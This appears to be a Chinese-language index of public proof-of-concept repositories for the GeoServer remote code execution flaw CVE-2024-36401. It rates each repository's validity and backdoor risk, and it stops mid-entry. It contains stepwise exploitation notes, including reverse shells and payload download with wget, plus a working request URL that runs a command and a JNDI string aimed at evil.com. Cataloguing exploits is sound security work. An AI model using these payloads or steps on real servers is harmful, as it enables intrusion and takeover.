**项目地址:** [URJACK2025/CVE-2024-36401](https://github.com/URJACK2025/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #7

**来源**: [CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md](../2024/CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的 OGC 请求参数执行远程代码。漏洞利用方式是通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求等多种方式。漏洞利用代码仓库中只包含 LICENSE 文件，并未发现任何可疑的投毒代码。

**项目地址:** [XiaomingX/cve-2024-36401-poc](https://github.com/XiaomingX/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #8

**来源**: [CVE-2024-36401-ahisec_geoserver-.md](../2024/CVE-2024-36401-ahisec_geoserver-.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许通过 WFS/WMS/WPS 接口进行网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的攻击者通过构造特制的OGC请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来执行远程代码。漏洞根源在于 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，这使得攻击者可以在 XPath 表达式中注入恶意代码。提供的PoC代码展示了如何利用 `wfs:GetPropertyValue` 请求执行命令。它首先建议使用 `wfs:ListStoredQueries` 获取有效的 `wfs:ReturnFeatureType` 值，然后将其用于构建 `wfs:Query typeNames` 参数，以提高漏洞利用的准确性。示例payload包括了ping命令的执行和反弹shell的payload，以及内存马注入的payload。文章中提到的误判几率较高是因为直接使用 `sf:archsites` ，如果目标环境中不存在该feature type,则会报错。建议先获取可用的feature type名称。

**有效性：**
提供的PoC代码利用了漏洞描述中提到的攻击向量，并且参考了GitHub上的公开PoC（https://github.com/Mr-xn/CVE-2024-36401）。多个搜索结果表明该漏洞正在被积极利用（https://www.fortinet.com/blog/threat-research/threat-actors-exploit-geoserver-vulnerability-cve-2024-36401，https://www.sonicwall.com/blog/geoserver-rce-vulnerability-cve-2024-36401-being-exploited-in-the-wild），表明该漏洞的利用是有效的。

**投毒风险：**
在提供的PoC代码中，没有发现明显的投毒代码。代码主要提供了漏洞利用的思路和示例payload，包括执行ping命令、反弹shell和注入内存马。反弹shell和内存马需要用户提供恶意代码，因此不存在作者隐藏的后门代码。因此，投毒风险评估为0%。

**利用方式：**
1.  **确定目标 GeoServer 版本：** 确认目标 GeoServer 版本在受影响的范围内。
2.  **获取有效的Feature Type：** 使用 `wfs:ListStoredQueries` 请求获取有效的 `<wfs:ReturnFeatureType>`值。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 `wfs:GetPropertyValue` 请求，其中 `wfs:Query typeNames` 参数使用从步骤2中获得的Feature Type.
4.  **发送请求：** 将构造的恶意请求发送到目标 GeoServer 的 WFS 接口。
5.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码。

**项目地址:** [ahisec/geoserver-](https://github.com/ahisec/geoserver-)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #9

**来源**: [CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md](../2024/CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.22.0 < version < 2.22.6
2.23.0 <= version < 2.23.6
2.24.0 <= version < 2.24.4
2.25.0 <= version < 2.25.2

**利用条件:** 需要网络访问，目标服务器运行存在漏洞的 GeoServer 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，源于 GeoTools 库 API 不安全地将属性名传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。漏洞存在于所有 GeoServer 实例中，可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**POC 有效性分析：**

提供的 POC 代码看起来是有效的。它包含以下关键功能：

*   使用 `requests` 库发送 HTTP 请求。
*   使用 `lxml` 库解析 XML 响应，提取 `Typenames`，并自动化的爬取所有Typenames信息，并循环测试可以利用的Typenames，修复Nuclei POC中由于Typenames写死，造成漏洞验证失败的问题。
*   支持 `-c` 参数执行命令，或使用 DNSLog 进行验证。
*   支持批量 URL 检测。

这些功能对应了漏洞的利用方式，即通过构造特定的 OGC 请求，利用 XPath 表达式注入执行任意命令。

**投毒风险分析：**

代码中存在轻微的投毒风险。风险点在于：

*   作者在代码中留下了版权声明，虽然这是正常的，但也增加了作者控制代码的风险。
*   虽然脚本本身的功能是漏洞利用，但如果作者恶意地修改了脚本，例如，在执行命令后添加额外的恶意操作，或者收集目标服务器的信息并发送给攻击者，那么就存在投毒风险。

综合考虑，投毒风险较低，约为 10%。此风险主要来自于作者是否会利用更新或维护代码的机会植入后门。

**利用方式总结：**

1.  **确定目标 GeoServer 版本：** 确认目标服务器运行的 GeoServer 版本在受影响范围内。
2.  **获取 Typenames：** 通过 WFS GetCapabilities 请求或其他方式获取目标 GeoServer 实例的 Typenames 信息。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 WFS/WMS/WPS 请求，将命令注入到 property/attribute name 中。
4.  **发送请求：** 将构造好的请求发送到目标 GeoServer 服务器。
5.  **验证漏洞：** 通过 DNSLog 或者检查命令执行结果验证漏洞是否存在。

例如，可以使用类似以下的 URL 构造恶意请求：

```
/geoserver/wfs?service=WFS&version=1.0.0&request=GetFeature&typeName=<typeName>&propertyName=fes:ResourceId&Filter=<%20fes:Filter%20xmlns:fes=%22http://www.opengis.net/fes/2.0%22%20xmlns:gml=%22http://www.opengis.net/gml/3.1.1%22%20xmlns:ogc=%22http://www.opengis.net/ogc%22><ogc:Function%20name=%22script:js%22><ogc:Literal><![CDATA[java.lang.Runtime.getRuntime().exec('touch /tmp/pwned');]]></ogc:Literal></ogc:Function></fes:Filter>
```

**项目地址:** [amoy6228/CVE-2024-36401_Geoserver_RCE_POC](https://github.com/amoy6228/CVE-2024-36401_Geoserver_RCE_POC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #10

**来源**: [CVE-2024-36401-bigb0x_CVE-2024-36401.md](../2024/CVE-2024-36401-bigb0x_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 需要目标GeoServer实例存在漏洞，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo和WPS Execute）利用此漏洞，执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以确认该POC代码是有效的。搜索结果中多个来源（如Fortinet、Keysight、SonicWall、Rapid7等）都表明该漏洞已被实际利用。

**投毒风险：**
分析提供的POC代码后，发现存在一定的投毒风险。虽然代码的主要功能是利用漏洞执行反向shell，但在以下几个方面存在潜在的投毒可能性：

1.  **对 nc 命令的依赖：**  POC 依赖目标系统存在 `nc` (netcat) 命令。如果目标系统没有 `nc`，利用会失败。攻击者可能会修改 POC，尝试使用其他命令（如 `wget` 或 `curl`）下载并执行恶意脚本，从而实现更隐蔽或更复杂的攻击。
2.  **反向 Shell 的隐蔽性：**  反向 shell 连接通常会被防火墙或入侵检测系统拦截。攻击者可能会尝试使用加密或其他混淆技术来绕过这些安全措施。
3.  **日志记录和错误处理：**  POC 具有基本的日志记录功能，但可能不足以记录所有关键操作。攻击者可以修改代码，删除或篡改日志，以隐藏其活动。

总的来说，由于POC的目的是快速验证漏洞，相对比较简单，因此投毒的可能性相对较低，但仍然需要警惕。

**利用方式：**
该漏洞的利用方式主要通过以下步骤：

1.  **构建恶意OGC请求：** 攻击者构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。
2.  **发送恶意请求：** 攻击者将构造的恶意请求发送到目标GeoServer实例。
3.  **执行任意代码：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库进行评估，从而导致任意代码执行。
4.  **反向Shell (POC使用):** POC 尝试建立反向 shell 连接，允许攻击者远程控制受感染的服务器。POC 发送一个POST请求，在请求中使用的payload来执行反向shell，连接到攻击者的机器。

**项目地址:** [bigb0x/CVE-2024-36401](https://github.com/bigb0x/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #11

**来源**: [CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md](../2024/CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称评估为 XPath 表达式，未经身份验证的用户可以通过构造特制的 OGC 请求参数来执行远程代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞利用已被证实有效，并且在野外已被利用。提供的漏洞利用代码（GeoServer-Tools）旨在简化利用过程，支持不同 JDK 版本的回显和内存马注入。

**投毒风险：**
查看了提供的POC代码，主要是一个GUI工具，利用了`woodpecker-requests`进行网络请求，`flatlaf`做界面美化。主要功能是发送payload到目标服务器，根据描述可以支持内存马注入，回显等功能。经过分析，该工具本身存在投毒的可能性较低。但考虑到代码审查的局限性，仍存在一定的风险，因此评估投毒风险为10%。这些风险可能包括：
  *   **非必要依赖：** 引入了不必要的依赖库，这些库可能包含未知的安全漏洞或被恶意利用。
  *   **后门代码：** 在工具中隐藏了后门代码，例如在内存马功能中，注入恶意代码。

**利用方式：**
1.  攻击者通过构造恶意的 OGC 请求（例如，WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求）来触发漏洞。
2.  恶意请求包含特制的 XPath 表达式，这些表达式在评估属性名称时被 GeoServer 不安全地执行。
3.  通过执行恶意 XPath 表达式，攻击者可以在 GeoServer 服务器上执行任意代码。
4.  漏洞利用代码（GeoServer-Tools）提供了一个图形界面，允许攻击者指定目标 GeoServer 实例的 URL，选择不同的攻击载荷（如 DNSLog、命令回显、内存马注入），并发送恶意请求。

**总结：**
CVE-2024-36401 是一个严重的安全漏洞，允许未经身份验证的攻击者在 GeoServer 上执行任意代码。提供的漏洞利用代码简化了利用过程，但需要谨慎使用，并注意潜在的投毒风险。

**项目地址:** [bmth666/GeoServer-Tools-CVE-2024-36401](https://github.com/bmth666/GeoServer-Tools-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #12

**来源**: [CVE-2024-36401-cochaviz_cve-2024-36401-poc.md](../2024/CVE-2024-36401-cochaviz_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** GeoServer服务可公开访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中一个严重级别的远程代码执行漏洞。该漏洞源于 GeoServer 调用的 GeoTools 库 API 在处理要素类型的属性名时，以不安全的方式将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。虽然最初设计仅用于复杂要素类型，但被错误地应用于简单要素类型，使得所有 GeoServer 实例都受影响。

**有效性：** 根据漏洞库信息、搜索引擎结果和 Mr-xn 提供的漏洞利用代码存储库的存在，确认该漏洞的POC是有效的, 且已被积极利用。

**投毒风险：** 提供的XML代码片段主要包含WMS Capabilities的信息，例如服务名称、标题、摘要、关键字、在线资源、联系方式、费用、访问限制、最大宽度和高度等。它还定义了各种请求类型（GetCapabilities、GetMap、GetFeatureInfo、GetStyles）及其格式和DCPType。XML似乎是合法的WMS capabilities文件，可能用于与GeoServer交互，但缺少触发RCE所需的恶意XPath表达式。因此，直接从提供的XML片段评估，投毒风险较低，约为10%，因为实际利用需要结合特定参数构造恶意请求。例如：攻击者可能使用 `${jndi:ldap://evil.com/evil}`这样的JNDI注入表达式。

**利用方式：**

1.  **攻击入口：** 攻击者可以通过构造特制的OGC（Open Geospatial Consortium）请求，如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute。
2.  **漏洞触发：** 这些请求中的特定参数（通常是属性名或属性表达式）会被 GeoServer 以不安全的方式传递给 commons-jxpath 库进行 XPath 评估。
3.  **代码执行：** 攻击者在参数中插入恶意 XPath 表达式，例如使用 `Runtime.getRuntime().exec()` 或通过 JNDI 注入等方式来执行任意代码。
4.  **影响：** 成功利用该漏洞可导致完全控制受影响的 GeoServer 系统。

**项目地址:** [cochaviz/cve-2024-36401-poc](https://github.com/cochaviz/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #13

**来源**: [CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许网络访问，且目标版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞。该漏洞源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，从而允许攻击者通过构造恶意的 XPath 表达式来执行任意代码。利用方式是通过构造恶意的 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求，在请求的参数中注入恶意代码。提供的 PoC 代码 `geopwn.py` 演示了如何通过 WFS GetPropertyValue 请求，利用`exec`函数执行系统命令。

**有效性：**  提供的PoC代码看起来有效。它利用了WFS服务的GetPropertyValue请求，并构造包含恶意代码的`valueReference`参数，利用`exec`函数执行命令。它首先生成一个反向shell的payload，然后通过wget下载到目标机器，赋予执行权限，并最终执行。

**投毒风险：**  PoC 代码本身主要功能是利用漏洞实现远程代码执行。但是，也存在一定的投毒风险：

*   **依赖下载：** PoC脚本会通过wget下载shell，脚本中使用的 URL (evilURL)  由用户提供，存在被替换为恶意文件的风险。
*   **msfvenom参数：**  PoC脚本直接调用msfvenom生成payload，如果攻击者修改msfvenom的参数，可以生成包含恶意功能的payload。

总体而言，由于大部分操作依赖用户提供的参数和配置，直接投毒的可能性较低，主要风险在于用户配置不当或使用恶意 payload。投毒风险评估为10%。

**利用方式：**

1.  **准备：** 使用 `msfvenom` 生成反向 shell payload，并在攻击者控制的服务器上启动 HTTP 服务以提供 payload 下载。
2.  **构造恶意请求：**  利用 WFS GetPropertyValue 请求，在 `valueReference` 参数中注入恶意代码，通过 `exec` 函数执行系统命令。
3.  **下载 Payload：** 使用 `wget` 命令从攻击者控制的服务器下载反向 shell payload。
4.  **执行 Payload：**  使用 `chmod +x` 命令赋予 payload 执行权限，然后执行 payload 以获得反向 shell。

**项目地址:** [daniellowrie/CVE-2024-36401-PoC](https://github.com/daniellowrie/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #14

**来源**: [CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未授权的攻击者可以通过构造恶意请求执行任意代码

**影响版本:** 受影响版本： < 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 目标GeoServer实例对外开放且未应用补丁或缓解措施

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中存在的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式导致。攻击者可以利用此漏洞通过构造特制的OGC请求（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）在目标服务器上执行任意代码。

**有效性：**
根据漏洞信息、搜索引擎结果，特别是CISA的已知被利用漏洞列表，以及提供的利用代码（WoodpeckerPlugin），可以判断此漏洞POC**有效**并且已被积极利用。

**投毒风险：**
提供的 WoodpeckerPlugin 旨在简化漏洞利用过程，但也存在一定投毒风险。风险点在于：
1.  **自定义内存马注入：** 虽然插件提供了默认的冰蝎内存马，但允许用户自定义内存马，如果用户不熟悉内存马，可能引入恶意代码。
2.  **Woodpecker 框架：** 该插件依赖于 Woodpecker 框架，若框架本身存在安全问题，则会影响所有插件。
3.  **源码审查不足：** 用户可能直接使用编译好的插件，而未进行充分的源码审查，增加了潜在的风险。虽然作者声明免责，但是下载来路不明的jar包，本身就存在风险。
4.  **命令执行的安全性：** 通过`command`参数执行任意命令，本身权限过大，存在风险。命令日志记录是否完善，也会影响溯源。
综合评估，投毒风险大约为10%，风险较低，主要集中在用户自定义操作上。

**利用方式：**
1.  **探测：** 使用插件的 Poc 模块进行批量探测，判断目标是否存在 CVE-2024-36401 漏洞。
2.  **命令执行：** 通过 Exploit 模块，设置 `command` 参数执行任意命令。
3.  **内存马注入：** 使用默认或自定义的内存马，注入到 GeoServer 进程中，实现更持久的控制。

**缓解措施：**
1.  升级 GeoServer 到已修复的版本 (>= 2.22.6, >= 2.23.6, >= 2.24.4, >= 2.25.2)。
2.  移除 `gt-complex-x.y.jar` 文件（可能影响部分功能）。
3.  使用防火墙或其他安全设备限制对 GeoServer 的访问。
4.  加强对GeoServer日志的监控，及时发现异常行为。

**项目地址:** [funnyDog896/CVE-2024-36401-WoodpeckerPlugin](https://github.com/funnyDog896/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #15

**来源**: [CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md](../2024/CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md)

# CVE-2024-36401

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-36401-0x0d3ad_CVE-2024-36401.md](../2024/CVE-2024-36401-0x0d3ad_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0, < 2.23.6, >= 2.24.0, < 2.24.4, >= 2.25.0, < 2.25.2

**利用条件:** 需要能够访问GeoServer服务的网络连接，默认安装环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式而导致。攻击者可以通过构造特制的 OGC 请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来利用此漏洞，从而在服务器上执行任意代码。提供的 POC 代码首先通过 GET 请求 `/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0` 获取 `ReturnFeatureType`，然后构造一个包含恶意 XPath 表达式的 POST 请求，发送到 `/geoserver/wfs`，表达式中利用 `java.lang.Runtime.getRuntime()` 执行 base64 编码的反弹 shell 命令。POC中的投毒风险较低，主要体现在脚本中可能包含潜在的恶意代码，或者利用社会工程学诱导用户执行恶意操作。例如，如果脚本被修改为下载和执行额外的恶意负载，或者收集用户的敏感信息，就会造成更大的安全威胁。 此处的"poison"指的是，如果攻击者上传包含后门代码的图层定义，然后诱导其他用户下载并使用该定义，则可能构成投毒攻击。

**项目地址:** [0x0d3ad/CVE-2024-36401](https://github.com/0x0d3ad/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #2

**来源**: [CVE-2024-36401-Chocapikk_CVE-2024-36401.md](../2024/CVE-2024-36401-Chocapikk_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 目标GeoServer实例运行在受影响的版本上，且允许网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞。该漏洞源于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库进行评估，从而允许未经身份验证的用户通过特制的OGC请求执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果（多个安全厂商已确认该漏洞被利用）和提供的漏洞利用代码，可以判定此漏洞是有效的，并且已经被积极利用。

**投毒风险：**
漏洞利用代码 `exploit.py` 主要是实现漏洞利用的功能，从代码结构和功能来看，投毒风险较低。主要功能是发送恶意请求，监听反弹shell。代码中也定义了一些参数，比如远程IP、远程端口、代理等等。代码比较清晰，逻辑简单。但是依然不能排除作者在某些不明显的代码中加入恶意代码的可能性，特别是代码涉及到网络请求和系统命令执行。因此，评估投毒风险为 10%。

**利用方式：**
1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求），其中包含特制的XPath表达式。这些请求会被GeoServer处理，并将属性名称传递给 commons-jxpath 库。
2.  **代码执行：** commons-jxpath 库在评估这些XPath表达式时，会执行攻击者注入的恶意代码。
3.  **反弹 Shell (POC中方式)：** 漏洞利用代码会启动一个监听器，然后在目标系统上执行命令以反弹 shell 到攻击者的机器上。  `exploit.py` 脚本允许攻击者指定目标 URL、攻击者 IP 地址和端口。通过命令行参数 `--url`, `--remote-ip`, 和 `--remote-port` 设置。
4.  **批量扫描:** 漏洞利用代码还支持批量扫描，通过 `--check <file_with_urls>` 指定包含URL列表的文件， `--threads <number_of_threads>`  指定线程数， `--output <output_file>` 指定输出文件。

**项目地址:** [Chocapikk/CVE-2024-36401](https://github.com/Chocapikk/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #3

**来源**: [CVE-2024-36401-Mr-xn_CVE-2024-36401.md](../2024/CVE-2024-36401-Mr-xn_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的用户可以通过构造的OGC请求执行任意代码

**影响版本:** 2.22.0 < version < 2.22.6, 2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** GeoServer服务可网络访问，并且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞。该漏洞源于GeoTools库API以不安全的方式将属性/属性名称传递给commons-jxpath库，从而允许执行任意代码。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic和WPS Execute）来利用此漏洞，执行任意代码。

**有效性：**
提供的POC代码利用了`valueReference`参数执行任意命令，例如计算器程序。从漏洞描述和搜索引擎结果来看，POC是有效的，并且已被野外利用。

**投毒风险：**
查看提供的POC代码和LICENSE文件。LICENSE采用MIT许可，相对宽松。代码本身主要是提供了漏洞的利用方式，没有发现明显的恶意代码。README中包含绕过WAF的payload，以及各种请求方式（GetPropertyValue, GetFeature）的PoC。

*   LICENSE文件: MIT License, 比较通用，没有发现可疑之处
*   README文件：提供了漏洞的描述和多个PoC示例，没有直接执行恶意操作的代码。

综合来看，投毒风险较低，在10%左右。主要风险来自于对POC的滥用，而非POC本身包含恶意代码。

**利用方式：**
1.  确定目标GeoServer版本在受影响范围内。
2.  使用提供的PoC构造恶意OGC请求。
3.  利用`valueReference`参数或`PropertyName`，注入包含恶意代码的XPath表达式。
4.  发送构造的请求到目标GeoServer服务器。
5.  如果漏洞存在，服务器将执行注入的代码。

**项目地址:** [Mr-xn/CVE-2024-36401](https://github.com/Mr-xn/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #4

**来源**: [CVE-2024-36401-Niuwoo_CVE-2024-36401.md](../2024/CVE-2024-36401-Niuwoo_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的攻击者可以通过精心构造的输入来执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，以及 2.23.0 到 2.23.6，2.24.0 到 2.24.4，以及 2.25.0 到 2.25.2。

**利用条件:** 需要目标GeoServer实例存在于网络上并且可以访问 /geoserver/wfs 接口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，源于 GeoTools 库 API 对属性名称的处理不当。攻击者可以通过向 GeoServer 的 WFS 接口发送特制的 OGC 请求，利用 XPath 表达式注入来执行任意代码。此漏洞影响默认 GeoServer 安装，无需身份验证。

**漏洞分析：**

根据漏洞库信息和搜索引擎结果，该漏洞允许未经身份验证的攻击者通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求执行任意代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，从而允许执行任意 XPath 表达式。

**POC 代码分析：**

提供的 POC 代码是一个 Python 脚本，用于检测和利用 CVE-2024-36401 漏洞。该脚本包含以下功能：

*   `check_vuln(url)`: 发送一个包含恶意 payload 的 WFS GetPropertyValue 请求到目标 GeoServer 实例，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为目标存在漏洞。
*   `exploit_vuln(url, cmd)`:  发送一个包含恶意 payload 的 WFS GetPropertyValue 请求，其中 payload 包含要执行的命令。该函数通过 `java.lang.Runtime.getRuntime()` 来执行命令。同样，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为利用成功。
*   `multithreading(url_list, pools=5)`:  使用线程池对 URL 列表执行漏洞检测。
*   `init_config()`:  解析命令行参数，包括目标 URL、URL 列表和要执行的命令。

**有效性：**

